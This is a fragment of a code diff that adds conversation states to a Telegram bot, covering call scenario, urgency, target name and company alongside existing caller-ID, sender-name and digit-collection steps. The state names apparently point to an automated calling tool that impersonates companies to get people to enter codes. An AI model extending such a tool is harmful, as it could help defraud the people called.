+                CallbackQueryHandler(normal_scenario, pattern="^normal_scenario_"),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, normal_scenario),
+            ],
             NORMAL_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_phone)],
+            NORMAL_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_name)],
+            NORMAL_URGENCY: [
+                CallbackQueryHandler(normal_urgency, pattern="^normal_urgency_"),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, normal_urgency),
+            ],
             NORMAL_CALLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_caller_id)],
             NORMAL_FROM_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_from_name)],
+            NORMAL_COMPANY: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_company)],
             NORMAL_LANGUAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_language)],
             NORMAL_DELIVERY: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_delivery)],
             NORMAL_DIGITS: [MessageHandler(filters.TEXT & ~filters.COMMAND, normal_digits)],
